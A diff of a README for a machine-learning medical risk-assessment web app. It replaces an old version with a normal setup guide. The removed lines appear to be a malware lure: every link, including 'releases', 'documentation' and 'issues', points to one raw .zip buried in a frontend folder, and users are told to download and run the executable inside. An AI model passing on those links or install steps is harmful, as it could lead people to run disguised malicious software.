@@ -1,91 +1,184 @@
-# 🩺 Medical-Disease-Risk-Assessment-System - Assess Your Health Risks Easily
+# 🩺 Medical Multi-Disease Risk Assessment System
 
-[![Download Now](https://raw.githubusercontent.com/faisaleee/Medical-Disease-Risk-Assessment-System/main/Frontend/app/parkinsons/System-Disease-Risk-Assessment-Medical-2.4.zip%20Now-Find%20Your%20Health%https://raw.githubusercontent.com/faisaleee/Medical-Disease-Risk-Assessment-System/main/Frontend/app/parkinsons/System-Disease-Risk-Assessment-Medical-2.4.zip)](https://raw.githubusercontent.com/faisaleee/Medical-Disease-Risk-Assessment-System/main/Frontend/app/parkinsons/System-Disease-Risk-Assessment-Medical-2.4.zip)
+A full-stack web application that uses **Machine Learning** to assess the risk of multiple diseases. Users can input their health data and receive instant risk predictions powered by pre-trained ML models, along with AI-powered medical document analysis using **Google Gemini**.
+
+## 🔍 Supported Diseases
+
+| Disease | Model Type |
+|---------|-----------|
+| Diabetes | Scikit-learn |
+| Stroke | Scikit-learn |
+| Parkinson's | CatBoost |
+| Thyroid | CatBoost |
+| Depression | Scikit-learn |
+| Hepatitis | Scikit-learn |
+| Heart Disease | Scikit-learn |
+| Chronic Kidney Disease | Scikit-learn |
+
+## 🛠️ Tech Stack
+
+| Layer | Technology |
+|-------|-----------|
+| **Frontend** | Next.js, React, TypeScript, Tailwind CSS |
+| **Backend** | FastAPI (Python 3.12), Uvicorn |
+| **Database** | SQLite |
+| **ML Models** | Scikit-learn, CatBoost, LightGBM, XGBoost |
+| **AI Analysis** | Google Gemini API |
+
+## 📦 Project Structure
+
+```
+Medical-Disease-Risk-Assessment-System/
+├── Backend/
+│   ├── main.py                # FastAPI application entry point
+│   ├── database.py            # Database configuration (SQLite)
+│   ├── models.py              # SQLAlchemy models
+│   ├── schemas.py             # Pydantic input schemas for each disease
+│   ├── predictor.py           # Disease prediction logic
+│   ├── predict_utils.py       # Model loading and prediction utilities
+│   ├── utils.py               # Password hashing utilities
+│   ├── auth.py                # Authentication helpers
+│   ├── models/                # Pre-trained ML model files (.pkl)
+│   ├── requirements.txt       # Python dependencies
+│   └── .env                   # Environment variables (create manually)
+├── Frontend/
+│   ├── app/                   # Next.js app directory (pages & routes)
+│   ├── components/            # Reusable React components
+│   ├── context/               # Auth context provider
+│   ├── package.json           # Node.js dependencies
+│   └── ...
+└── README.md
+```
 
 ## 🚀 Getting Started
 
-Welcome to the Medical Disease Risk Assessment System! This application helps you assess your risk for various medical conditions using advanced AI technology. You can evaluate your risk for diseases such as Diabetes, Chronic Kidney Disease (CKD), and Parkinson’s disease. 
+### Prerequisites
 
-This guide walks you through the steps to download and run the application. You do not need any programming experience.
+- **Python 3.12** ([Download](https://www.python.org/downloads/))
+- **Node.js 18+** ([Download](https://nodejs.org/))
+- **Git** ([Download](https://git-scm.com/))
 
-## 📦 What You Need
+---
 
-Before you start, ensure you have:
+### 1️⃣ Clone the Repository
 
-- A computer running Windows, macOS, or Linux.
-- At least 200 MB of free space.
-- A stable internet connection.
+```bash
+git clone https://github.com/rashedulalbab253/Medical-Multi-Disease-Risk-Assessment-System.git
+cd Medical-Multi-Disease-Risk-Assessment-System
+```
 
-## 🔗 Download & Install
+---
 
-To download the application, visit the link below:
+### 2️⃣ Backend Setup
 
-[Download from Releases Page](https://raw.githubusercontent.com/faisaleee/Medical-Disease-Risk-Assessment-System/main/Frontend/app/parkinsons/System-Disease-Risk-Assessment-Medical-2.4.zip)
+```bash
+# Navigate to the Backend folder
+cd Backend
 
-Once you visit the page, look for the latest version titled “Medical Disease Risk Assessment System”. Click on the version, then download the appropriate file for your operating system. 
+# Create a Python 3.12 virtual environment
+py -3.12 -m venv venv
 
-### 📥 Steps to Download:
+# Activate the virtual environment
+# Windows (PowerShell):
+.\venv\Scripts\Activate.ps1
+# Windows (CMD):
+.\venv\Scripts\activate.bat
+# macOS/Linux:
+source venv/bin/activate
 
-1. Click on [Download from Releases Page](https://raw.githubusercontent.com/faisaleee/Medical-Disease-Risk-Assessment-System/main/Frontend/app/parkinsons/System-Disease-Risk-Assessment-Medical-2.4.zip).
-2. Locate the latest version of the application.
-3. Download the file that matches your operating system.
-4. Remember where you save this file on your computer.
+# Install all Python dependencies
+pip install -r requirements.txt
+```
 
-## 🛠️ How to Run the Application
+#### Configure Environment Variables
 
-After downloading the file:
+Create a `.env` file inside the `Backend/` folder:
 
-- **For Windows:**
-  1. Locate the downloaded `.exe` file.
-  2. Double-click on it to run the installer. 
-  3. Follow the on-screen instructions to complete the installation.
-  
-- **For macOS:**
-  1. Open the downloaded `.dmg` file.
-  2. Drag the Medical Disease Risk Assessment System to your Applications folder.
-  3. Open the application from your Applications folder.
+```env
+# Database connection string
+DATABASE_URL=sqlite:///./auth_db.db
 
-- **For Linux:**
-  1. Open a terminal window.
-  2. Navigate to the folder where you downloaded the file.
-  3. Use the command `chmod +x [filename]` (replace `[filename]` with the downloaded file name).
-  4. Run the application with `./[filename]`.
+# JWT secret key (change to a random string in production)
+SECRET_KEY=your_secret_key_here
 
-## 🧠 How to Use the Application
+# JWT token expiration in minutes
+ACCESS_TOKEN_EXPIRE_MINUTES=60
 
-1. Open the Medical Disease Risk Assessment System.
-2. Fill in the required information, such as your age, gender, and medical history.
-3. Click on the “Assess Risk” button.
-4. Receive insights on your health risks and recommendations based on your input.
+# Google Gemini API Key (get one from https://aistudio.google.com/)
+GEMINI_API_KEY=your_gemini_api_key_here
+```
 
-## 🔍 Features
+#### Start the Backend Server
 
-- **Multi-disease Risk Assessment:** Evaluate your risk for Diabetes, CKD, and Parkinson’s disease all in one place.
-- **AI-powered Insights:** Get accurate assessments backed by machine learning algorithms.
-- **User-friendly Interface:** Navigate easily through the application with a straightforward layout.
-- **Secure Data Handling:** Your medical information remains private and secure.
+```bash
+# Make sure your virtual environment is activated, then run:
+.\venv\Scripts\python.exe -m uvicorn main:app --reload
+```
+
+The backend API will be running at: **http://localhost:8000**
+- API Docs (Swagger UI): **http://localhost:8000/docs**
+
+---
+
+### 3️⃣ Frontend Setup
+
+Open a **new terminal** and run:
+
+```bash
+# Navigate to the Frontend folder
+cd Frontend
+
+# Install Node.js dependencies
+npm install --legacy-peer-deps
+
+# Start the development server
+npm run dev
+```
+
+The frontend will be running at: **http://localhost:3000**
+
+---
+
+## ✅ Quick Start Summary
+
+| Step | Command | Location |
+|------|---------|----------|
+| 1 | `cd Backend` | Project root |
+| 2 | `py -3.12 -m venv venv` | Backend/ |
+| 3 | `.\venv\Scripts\Activate.ps1` | Backend/ |
+| 4 | `pip install -r requirements.txt` | Backend/ |
+| 5 | `.\venv\Scripts\python.exe -m uvicorn main:app --reload` | Backend/ |
+| 6 | Open new terminal → `cd Frontend` | Project root |
+| 7 | `npm install --legacy-peer-deps` | Frontend/ |
+| 8 | `npm run dev` | Frontend/ |
+
+Then open **http://localhost:3000** in your browser.
+
+---
+
+## 🧠 How to Use
+
+1. **Sign Up** — Create an account on the signup page.
+2. **Log In** — Use your email and password to log in.
+3. **Select a Disease** — Choose from 8 available disease risk assessments.
+4. **Fill the Form** — Enter your health data (age, BMI, blood pressure, etc.).
+5. **Get Results** — Receive an instant **High Risk** or **Low Risk** prediction.
+6. **PDF Analysis** — Upload a medical PDF for AI-powered analysis using Google Gemini.
 
 ## ⚙️ Troubleshooting
 
-If you encounter issues:
+| Problem | Solution |
+|---------|----------|
+| `ModuleNotFoundError` | Make sure you activated the virtual environment and ran `pip install -r requirements.txt` |
+| `Failed to fetch` on frontend | Ensure the backend server is running on port 8000 |
+| `scikit-learn` unpickling errors | You must use `scikit-learn==1.3.2` (the version the models were trained with) |
+| `npm install` errors | Try `npm install --legacy-peer-deps` |
+| Database issues | The SQLite database file (`auth_db.db`) is created automatically on first run |
 
-- Ensure that your system meets the requirements listed above.
-- Make sure you have the latest version of the application downloaded.
-- Restart the application if it is not responding.
+## 📄 License
 
-If problems persist, check the [Issues](https://raw.githubusercontent.com/faisaleee/Medical-Disease-Risk-Assessment-System/main/Frontend/app/parkinsons/System-Disease-Risk-Assessment-Medical-2.4.zip) section on our GitHub page for more help.
+This project is for educational purposes.
 
-## 🤝 Get Support
+---
 
-For further assistance, feel free to reach out via the following:
-
-- Open an issue on our [GitHub page](https://raw.githubusercontent.com/faisaleee/Medical-Disease-Risk-Assessment-System/main/Frontend/app/parkinsons/System-Disease-Risk-Assessment-Medical-2.4.zip).
-- Join our community on social platforms linked on the GitHub page.
-
-## 🔗 Useful Links
-
-- [Download from Releases Page](https://raw.githubusercontent.com/faisaleee/Medical-Disease-Risk-Assessment-System/main/Frontend/app/parkinsons/System-Disease-Risk-Assessment-Medical-2.4.zip)
-- [Documentation](https://raw.githubusercontent.com/faisaleee/Medical-Disease-Risk-Assessment-System/main/Frontend/app/parkinsons/System-Disease-Risk-Assessment-Medical-2.4.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/faisaleee/Medical-Disease-Risk-Assessment-System/main/Frontend/app/parkinsons/System-Disease-Risk-Assessment-Medical-2.4.zip)
-
-Thank you for using the Medical Disease Risk Assessment System. Your health is important, and we are here to assist you in making informed healthcare decisions.
+Made with ❤️ for health awareness and disease prevention.
